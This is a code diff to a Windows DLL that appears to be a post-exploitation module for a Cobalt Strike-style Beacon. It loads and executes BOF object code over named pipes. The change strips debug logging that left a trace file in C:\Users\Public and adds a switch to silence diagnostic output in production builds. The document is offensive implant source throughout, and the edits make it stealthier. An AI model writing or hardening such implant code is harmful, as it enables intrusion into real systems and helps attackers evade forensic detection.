@@ -41,16 +41,13 @@ typedef struct {
 	int  userArgumentBufferSize;
 } POSTEX_ARGUMENTS;
 
-/* stage trace (C-19 debugging): append-only file log, best effort */
-static void eclog(const char * msg) {
-	HANDLE f = CreateFileA("C:\\Users\\Public\\asyncdll_trace.txt", FILE_APPEND_DATA, 0, NULL,
-	                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (f == INVALID_HANDLE_VALUE) return;
-	WriteFile(f, msg, (DWORD)strlen(msg), NULL, NULL);
-	CloseHandle(f);
-}
 
 #define DLL_POSTEX_ATTACH 4
+
+/* diagnostics gate (C-24): the [asyncdiag] lines (parse summary,
+ * zero-text refusal, bg-wait ticks, followup recv) ride the normal
+ * output channels - flip to 0 for a quiet production build. */
+#define ASYNCDLL_DIAG 1
 
 /* ---------------- mini LE parser ---------------- */
 typedef struct { char * b; int n; } DATAP;
@@ -322,7 +319,7 @@ static int run_bof(char * wire, int wireLen) {
 			"[asyncdiag] wire=%d bss=%d text=%d rdata=%d data=%d xdata=%d pdata=%d relocs=%d entry=0x%x args=%d",
 			wireLen, bssSize, seclen[SEC_TEXT], seclen[SEC_RDATA], seclen[SEC_DATA],
 			seclen[SEC_XDATA], seclen[SEC_PDATA], relocLen, entry, argLen);
-		if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
+		if (dn > 0 && ASYNCDLL_DIAG) { diag[dn] = 0; shim_output(0, diag, dn); }
 	}
 
 	/* allocate + copy */
@@ -354,7 +351,7 @@ static int run_bof(char * wire, int wireLen) {
 			int dn = _snprintf(diag, sizeof(diag) - 1,
 				"[asyncdiag] TEXT ALL-ZERO AFTER COPY - refusing exec (wire=%d text=%d)",
 				wireLen, seclen[SEC_TEXT]);
-			if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
+			if (dn > 0 && ASYNCDLL_DIAG) { diag[dn] = 0; shim_output(0, diag, dn); }
 			return -3;
 		}
 	}
@@ -527,7 +524,7 @@ static int read_next_blob(HANDLE ctrl, char ** pipeOut, char ** bofOut, int * bo
 				char diag[80];
 				int dn = _snprintf(diag, sizeof(diag) - 1,
 					"[asyncdiag] bg-wait t+%ds avail=%d", tries, (int)avail);
-				if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
+				if (dn > 0 && ASYNCDLL_DIAG) { diag[dn] = 0; shim_output(0, diag, dn); }
 				if (g_ctrl != INVALID_HANDLE_VALUE && g_outLen > 0) {
 					flush_output_ctrl_ex(g_ctrl, FALSE);
 					g_outLen = 0;
@@ -555,7 +552,7 @@ static int read_next_blob(HANDLE ctrl, char ** pipeOut, char ** bofOut, int * bo
 				int dn = _snprintf(diag, sizeof(diag) - 1,
 					"[asyncdiag] bad followup avail=%d pl=%d bl=%d (kept waiting)",
 					(int)avail, pl, bl);
-				if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
+				if (dn > 0 && ASYNCDLL_DIAG) { diag[dn] = 0; shim_output(0, diag, dn); }
 				if (g_ctrl != INVALID_HANDLE_VALUE && g_outLen > 0) {
 					flush_output_ctrl_ex(g_ctrl, FALSE);
 					g_outLen = 0;
@@ -568,7 +565,7 @@ static int read_next_blob(HANDLE ctrl, char ** pipeOut, char ** bofOut, int * bo
 			char diag[96];
 			int dn = _snprintf(diag, sizeof(diag) - 1,
 				"[asyncdiag] followup recv pipe=%d wire=%d", pl, bl);
-			if (dn > 0) { diag[dn] = 0; shim_output(0, diag, dn); }
+			if (dn > 0 && ASYNCDLL_DIAG) { diag[dn] = 0; shim_output(0, diag, dn); }
 			if (g_ctrl != INVALID_HANDLE_VALUE && g_outLen > 0) {
 				flush_output_ctrl_ex(g_ctrl, FALSE);
 				g_outLen = 0;
@@ -607,9 +604,7 @@ static void run_async(LPVOID raw) {
 	dp_lenstr(&d, &tl); /* threadStart (unused) */
 	pipeName = dp_lenstr(&d, &pl);
 	bof = dp_lenstr(&d, &bl);
-	eclog("st: run_async parsed args\n");
 	if (!pipeName || pl <= 1 || !bof) {
-		eclog("st: ARG PARSE FAILED\n");
 		return;
 	}
 
@@ -618,9 +613,7 @@ static void run_async(LPVOID raw) {
 		memcpy(pn, pipeName, pl);
 		pn[pl - 1] = 0;
 		g_outLen = 0;
-		eclog("st: run_bof enter\n");
 		run_bof(bof, bl);
-		eclog("st: run_bof returned\n");
 		if (runOnce) {
 			/* kit once-mode parity (2026-11-12 live forensics): the beacon's
 			 * CONTROL-pipe register (ExecuteDllJob 101, wait=15000) runs
@@ -657,24 +650,11 @@ static void run_async(LPVOID raw) {
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
-	{
-		HANDLE f = CreateFileA("C:\\Users\\Public\\asyncdll_trace.txt", FILE_APPEND_DATA, 0, NULL,
-		                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-		if (f != INVALID_HANDLE_VALUE) {
-			char b2[64];
-			int n2 = _snprintf(b2, 63, "st: DllMain reason=%lu\n", dwReason);
-			WriteFile(f, b2, n2, NULL, NULL);
-			CloseHandle(f);
-		}
-	}
 	switch (dwReason) {
 		case DLL_PROCESS_ATTACH:
-			eclog("st: PROCESS_ATTACH enter\n");
 			DisableThreadLibraryCalls(hinstDLL);
-			eclog("st: PROCESS_ATTACH ok\n");
 			return TRUE;
 		case DLL_POSTEX_ATTACH: {
-			eclog("st: postex-attach enter\n");
 			/* control pipe server on the client-patched name; Beacon's
 			 * bundled job registration connects within seconds */
 			HANDLE h;
@@ -683,21 +663,16 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			                     PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, 1,
 			                     1024 * 1024, 1024 * 1024, 0, NULL);
 			if (h == INVALID_HANDLE_VALUE) {
-			eclog("st: CreateNamedPipeA(control) FAILED\n");
 			return FALSE;
 		}
-			eclog("st: control pipe server up\n");
 			for (tries = 0; tries < 15; tries++) {
 				BOOL c = ConnectNamedPipe(h, NULL);
 				if (c || GetLastError() == ERROR_PIPE_CONNECTED) break;
 				Sleep(1000);
 			}
 			if (tries >= 15) { CloseHandle(h); return FALSE; }
-			eclog("st: control client connected\n");
 			g_ctrl = h;
-			eclog("st: run_async enter\n");
 			run_async(lpReserved);
-			eclog("st: run_async returned\n");
 			FlushFileBuffers(h);
 			DisconnectNamedPipe(h);
 			CloseHandle(h);
